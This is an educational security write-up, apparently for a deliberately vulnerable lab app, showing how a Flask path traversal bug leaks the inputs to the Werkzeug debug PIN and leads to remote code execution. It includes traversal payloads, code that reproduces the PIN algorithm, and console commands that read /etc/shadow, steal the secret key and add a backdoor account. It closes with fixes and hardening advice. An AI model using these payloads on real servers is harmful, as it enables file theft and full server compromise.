# Path Traversal + Werkzeug Debug PIN → Remote Code Execution

This is the most dangerous attack chain in this application. It combines two vulnerabilities that seem moderate on their own but become catastrophic together.

---

## What Happened

The application has a file download feature at `/download?file=filename`. It looks harmless — just a way to let users download their files. But the endpoint never checks whether the filename contains `../` sequences. These sequences tell the operating system to go up one directory level.

So instead of requesting `/download?file=readme.txt`, an attacker requests:

```
/download?file=../../../etc/passwd
```

The server obediently walks up from `static/files/` into the root filesystem and reads `/etc/passwd`. No authentication bypass needed, no SQL injection, no buffer overflow. Just dots and slashes.

This is called **Path Traversal** or **Local File Inclusion (LFI)**.

---

## Why It Matters for Werkzeug

On its own, reading files is bad but limited — you can steal configuration, source code, maybe credentials. But this application also runs with `debug=True`, which activates the Werkzeug interactive debugger.

The debugger lets anyone execute Python code on the server through a browser console. The only thing protecting it is a PIN code. And here is the problem: that PIN is not random.

The PIN is calculated from six values:

**Public bits** (leaked on any error page):
1. **Username** — visible in the stack trace file paths: `File "/home/potato/project/app.py"` → username is `potato`
2. **Module name** — always `flask.app` for a standard Flask application
3. **App class name** — always `Flask` unless someone subclassed it
4. **Flask module path** — the full path to `flask/app.py`, shown in the traceback

**Private bits** (this is where LFI comes in):
5. **MAC address** — stored in `/sys/class/net/eth0/address` as plain text
6. **Machine ID** — stored in `/etc/machine-id`, supplemented by `/proc/self/cgroup`

An attacker who can read arbitrary files can collect ALL of these values.

---

## The Attack Step by Step

### Step 1 — Trigger an Error

The attacker visits a URL that causes an unhandled exception:

```
GET /debug_test
GET /notes/doesnt_exist
GET /download?file=
```

The Werkzeug debugger page appears with a full Python stack trace. The traceback reveals file paths, which contain the username and Flask installation location.

### Step 2 — Read Private Files via LFI

The attacker sends three requests through the vulnerable download endpoint:

```
GET /download?file=../../../sys/class/net/eth0/address
→ Returns: "aa:bb:cc:dd:ee:ff"

GET /download?file=../../../etc/machine-id
→ Returns: "de982c43d64e481aab9d6addbf6845c0"

GET /download?file=../../../proc/self/cgroup
→ Returns: "0::/system.slice/flask.service"
```

Now the attacker has all six values.

### Step 3 — Calculate the PIN

Werkzeug is open source. The PIN algorithm is in `werkzeug/debug/__init__.py` on GitHub. Anyone can read it. The algorithm feeds all six values into a SHA-1 hash:

```python
import hashlib
from itertools import chain

public_bits = [username, "flask.app", "Flask", flask_path]
private_bits = [str(mac_as_integer), machine_id_bytes]

h = hashlib.sha1()
for bit in chain(public_bits, private_bits):
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")
h.update(b"pinsalt")
pin = f"{int(h.hexdigest(), 16):09d}"[:9]
# Format: XXX-XXX-XXX
```

The output is a 9-digit PIN. Deterministic, reproducible, and now known to the attacker.

### Step 4 — Enter the Debugger

The attacker goes back to the error page, clicks the small console icon next to any traceback line, and enters the calculated PIN.

A Python prompt appears. It runs on the server.

### Step 5 — Game Over

```python
>>> import os
>>> os.popen('whoami').read()
'potato\n'

>>> os.popen('cat /etc/shadow').read()
# Password hashes (if running as root)

>>> import flask
>>> flask.current_app.config['SECRET_KEY']
'super-secret-key-123'
# Can now forge any session cookie

>>> from models import Note
>>> [(n.id, n.title) for n in Note.query.all()]
# Read the entire database

>>> import app; app.USERS['backdoor'] = 'backdoor123'
# Backdoor account created in memory
```

The server is completely compromised.

---

## The Code That Made This Possible

Here is the vulnerable download endpoint, stripped to its core:

```python
@app.route('/download')
def download_file():
    filename = request.args.get('file', '')
    base_dir = os.path.join(os.path.dirname(__file__), 'static', 'files')
    file_path = os.path.join(base_dir, filename)

    with open(file_path, 'r') as f:
        content = f.read()
    return content
```

The problem is on the third line. `os.path.join(base_dir, filename)` does not prevent `../` sequences. If `filename` is `../../../etc/passwd`, the resulting path walks out of `static/files/` and into the system root.

And the debug mode, one line in `app.py`:

```python
app.run(debug=True)
```

That single `True` activates the interactive debugger in production.

---

## Why Neither Vulnerability Alone Is Enough

**debug=True without LFI?** The debugger is protected by a PIN. Without file-read access, the attacker cannot get the MAC address or machine ID needed to calculate it. They can see the stack trace (information leak) but cannot execute code. Annoying but not catastrophic.

**LFI without debug=True?** The attacker can read files — source code, configuration, maybe database files. Serious, but they cannot execute arbitrary commands. They are limited to what is already on disk.

**Both together?** The LFI provides the PIN inputs, the debugger provides the code execution. Two moderate vulnerabilities become one critical chain.

This is why security works in layers. No single defense should be the only thing standing between an attacker and full access.

---

## How to Prevent This

**Fix the LFI — validate file paths:**

```python
import os

@app.route('/download')
def download_file():
    filename = request.args.get('file', '')
    base_dir = os.path.join(os.path.dirname(__file__), 'static', 'files')
    
    # Resolve the REAL path after following ../
    file_path = os.path.realpath(os.path.join(base_dir, filename))
    
    # Check that the resolved path is still inside base_dir
    if not file_path.startswith(os.path.realpath(base_dir)):
        abort(403)  # Path traversal detected
    
    return send_from_directory(base_dir, filename)
```

`os.path.realpath()` resolves all `../` sequences to produce the actual absolute path. Then a simple `startswith` check ensures the file is still within the allowed directory.

**Fix the debug mode:**

```python
# NEVER in production:
# app.run(debug=True)

# Instead:
if __name__ == '__main__':
    app.run(debug=False)
```

Or better yet, use a production WSGI server like Gunicorn that does not have an interactive debugger at all.

**Defense in depth — even if one fix is missed:**

- Set `SESSION_COOKIE_HTTPONLY = True` so JavaScript cannot read cookies
- Set `Content-Security-Policy` headers to block inline scripts
- Use a non-root user to run the application
- Keep `/etc/machine-id` readable only by root
- Monitor for unusual file access patterns in logs

---

## Automated Attack Script

The `scripts/lfi_to_rce.py` script automates this entire chain:

```bash
python3 scripts/lfi_to_rce.py --target http://127.0.0.1:5000
```

It triggers the error page, reads files through LFI, calculates the PIN, and tells you exactly what to type in the debugger console. Five phases, fully automated, from zero to RCE.
